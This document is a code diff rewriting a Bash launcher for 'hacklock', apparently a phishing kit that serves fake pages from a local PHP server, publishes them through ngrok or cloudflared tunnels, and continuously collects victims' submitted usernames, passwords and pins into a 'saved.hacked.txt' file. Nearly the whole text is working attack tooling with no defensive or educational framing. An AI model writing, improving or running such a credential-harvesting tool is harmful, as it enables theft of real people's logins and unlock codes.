@@ -1,51 +1,111 @@
-# --- Kali-friendly start() और helpers ---
 
-# helper: find executable (system-wide पहले, फिर $HOME/hacklock)
+#!/usr/bin/env bash
+# Minimal Kali-friendly hacklock launcher (single-file)
+# Put this script in ~/hacklock and run: ./hacklock.sh
+
+set -u
+HOME_DIR="${HOME:-/root}/hacklock"
+
+# ---------- utilities ----------
 find_exec() {
-  name="$1"
-  if command -v "$name" >/dev/null 2>&1; then
-    command -v "$name"
-  elif [[ -x "$HOME/hacklock/$name" ]]; then
-    echo "$HOME/hacklock/$name"
+  if command -v "$1" >/dev/null 2>&1; then
+    command -v "$1"
+  elif [[ -x "$HOME_DIR/$1" ]]; then
+    echo "$HOME_DIR/$1"
   else
     echo ""
   fi
 }
 
+# ---------- banner ----------
+banner() {
+  clear
+  printf "\n"
+  printf "  _|    _|                      _|        _|                            _|\n"
+  printf "  |    |    |||    |||  _|  _|    |          ||      |||  |  | \n"
+  printf "  ||||  _|    _|  _|        ||      _|        _|    _|  _|        |\n"
+  printf "  _|    _|  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  |\n"
+  printf "  |    |    |||    |||  |    |  ||||    ||      |||  _|    _| v2.0 \n"
+  printf "\n"
+  printf "           >> Script by N17R0 (Kali-friendly edit) <<\n\n"
+}
+
+# ---------- dependencies ----------
+dependencies() {
+  local miss=0
+  for cmd in php curl wget; do
+    if ! command -v "$cmd" >/dev/null 2>&1; then
+      echo "[!] Missing: $cmd"
+      miss=1
+    fi
+  done
+  if [[ $miss -eq 1 ]]; then
+    echo "[!] Install missing packages and re-run. (eg: sudo apt update && sudo apt install php curl wget -y)"
+    return 1
+  fi
+  return 0
+}
+
+# ---------- catch credentials ----------
+catch_cred() {
+  local users_file="$HOME_DIR/core/pattern/usernames.txt"
+  if [[ -f "$users_file" ]]; then
+    echo "[*] Found usernames file: $users_file"
+    grep -n '.' "$users_file" || true
+    # extract password pattern if present
+    if grep -q 'password' "$users_file"; then
+      echo "[*] Extracting password lines:"
+      grep -i 'password' "$users_file" | sed 's/^/    /'
+    fi
+    cat "$users_file" >> "$HOME_DIR/core/pattern/saved.hacked.txt"
+    echo "[*] Saved appended to core/pattern/saved.hacked.txt"
+    rm -f "$users_file"
+  fi
+}
+
+# ---------- checkfound loop ----------
+checkfound() {
+  echo
+  echo "[*] Waiting for pins/creds. Press Ctrl+C to stop..."
+  while true; do
+    catch_cred
+    sleep 1
+  done
+}
+
+# ---------- start server & forwarders ----------
 start() {
-  # साफ़-सफ़ाई पहले
-  rm -f "$HOME/hacklock/core/pattern/ip.txt" 2>/dev/null || true
-  rm -f "$HOME/hacklock/core/pattern/usernames.txt" 2>/dev/null || true
-  rm -f "$HOME/hacklock/cloudflare-log" 2>/dev/null || true
+  # cleanup
+  rm -f "$HOME_DIR/core/pattern/ip.txt" 2>/dev/null || true
+  rm -f "$HOME_DIR/core/pattern/usernames.txt" 2>/dev/null || true
+  rm -f "$HOME_DIR/cloudflare-log" 2>/dev/null || true
 
-  # चेक कि php मौजूद है
+  # ensure pattern directory exists
+  if [[ ! -d "$HOME_DIR/core/pattern" ]]; then
+    echo "[!] Missing: $HOME_DIR/core/pattern (create and put site files there)"
+    return 1
+  fi
+
+  # php
   if ! command -v php >/dev/null 2>&1; then
-    echo "[!] php not found. Install php and try again."
+    echo "[!] php not found. Install php and retry."
     return 1
   fi
 
-  # कौन से forwarders उपलब्ध हैं
-  NGROK_BIN=$(find_exec ngrok)
-  CLOUDFLARE_BIN=$(find_exec cloudflared)
-
-  if [[ -z "$NGROK_BIN" && -z "$CLOUDFLARE_BIN" ]]; then
-    echo "[!] Neither ngrok nor cloudflared found. Install at least one."
-    return 1
-  fi
-
-  # php server शुरू करो (local)
-  echo "[*] Starting php server on 127.0.0.1:5678 ..."
-  cd "$HOME/hacklock/core/pattern" || { echo "core/pattern missing"; return 1; }
+  # start local php server
+  echo "[*] Starting PHP server on 127.0.0.1:5678 ..."
+  cd "$HOME_DIR/core/pattern" || return 1
   php -S 127.0.0.1:5678 >/dev/null 2>&1 &
   PHP_PID=$!
-  sleep 2
+  sleep 1
 
-  # ngrok शुरू (यदि उपलब्ध)
+  # ngrok
+  NGROK_BIN=$(find_exec ngrok)
   if [[ -n "$NGROK_BIN" ]]; then
     echo "[*] Starting ngrok ..."
     nohup "$NGROK_BIN" http 127.0.0.1:5678 >/dev/null 2>&1 &
-    sleep 3
-    # ngrok की local API से लिंक निकालो
+    sleep 2
+    # try to get public url from api
     if curl -s http://127.0.0.1:4040/api/tunnels >/dev/null 2>&1; then
       NGROK_LINK=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -oE '"public_url":"https://[^"]+' | head -n1 | sed 's/.*:"//')
     else
@@ -55,14 +115,13 @@ start() {
     NGROK_LINK=""
   fi
 
-  # cloudflared शुरू (यदि उपलब्ध)
+  # cloudflared
+  CLOUDFLARE_BIN=$(find_exec cloudflared)
   if [[ -n "$CLOUDFLARE_BIN" ]]; then
     echo "[*] Starting cloudflared ..."
-    # logfile बनाएँ
-    LOGFILE="$HOME/hacklock/cloudflare-log"
+    LOGFILE="$HOME_DIR/cloudflare-log"
     nohup "$CLOUDFLARE_BIN" tunnel --url http://127.0.0.1:5678 > "$LOGFILE" 2>&1 &
     sleep 6
-    # logfile में public link खोजो (trycloudflare.com pattern)
     if [[ -f "$LOGFILE" ]]; then
       CLOUDFLARE_LINK=$(grep -oE 'https://[-0-9a-z]+\.trycloudflare\.com' "$LOGFILE" | head -n1 || true)
     else
@@ -72,31 +131,28 @@ start() {
     CLOUDFLARE_LINK=""
   fi
 
-  # आउटपुट
+  # print results
   if [[ -n "$NGROK_LINK" ]]; then
-    printf "\e[1;92m[*] (NGROK) link: \e[0m\e[1;77m%s\e[0m\n" "$NGROK_LINK"
+    printf "[*] (NGROK) link: %s\n" "$NGROK_LINK"
   else
-    echo "[!] ngrok link not found (ngrok may be not running or API not reachable)."
+    echo "[!] ngrok not running or API not available."
   fi
-
   if [[ -n "$CLOUDFLARE_LINK" ]]; then
-    printf "\e[1;92m[*] (Cloudflare) link: \e[0m\e[1;77m%s\e[0m\n" "$CLOUDFLARE_LINK"
+    printf "[*] (Cloudflare) link: %s\n" "$CLOUDFLARE_LINK"
   else
-    echo "[!] cloudflared link not found in logfile (check $HOME/hacklock/cloudflare-log)."
+    echo "[!] cloudflared link not found in logfile."
   fi
 
-  # अब checkfound loop call करो (जैसा पुराना flow था)
   checkfound
 }
 
-# fixer: ngrok authtoken और permissions के लिए सरल helper
+# ---------- fixer ----------
 fixer() {
   NGROK_BIN=$(find_exec ngrok)
   if [[ -z "$NGROK_BIN" ]]; then
-    echo "[!] ngrok not found. Place ngrok in PATH or in $HOME/hacklock/"
+    echo "[!] ngrok not found. Put ngrok binary in PATH or $HOME_DIR/"
     return 1
   fi
-
   read -p $'\n[+] Enter NGROK AUTHTOKEN: ' token
   if [[ -n "$token" ]]; then
     "$NGROK_BIN" authtoken "$token"
@@ -105,3 +161,29 @@ fixer() {
     echo "[!] No token provided."
   fi
 }
+
+# ---------- menu ----------
+menu() {
+  while true; do
+    echo
+    echo "1) Start pattern server"
+    echo "2) Fix ngrok (set authtoken)"
+    echo "3) Exit"
+    read -p $'\nChoose: ' opt
+    case "$opt" in
+      1) start ;;
+      2) fixer ;;
+      3) exit 0 ;;
+      *) echo "Invalid choice." ;;
+    esac
+  done
+}
+
+# ---------- main ----------
+banner
+if ! dependencies; then
+  echo "[!] Resolve dependencies then run again."
+  exit 1
+fi
+menu
+EOF
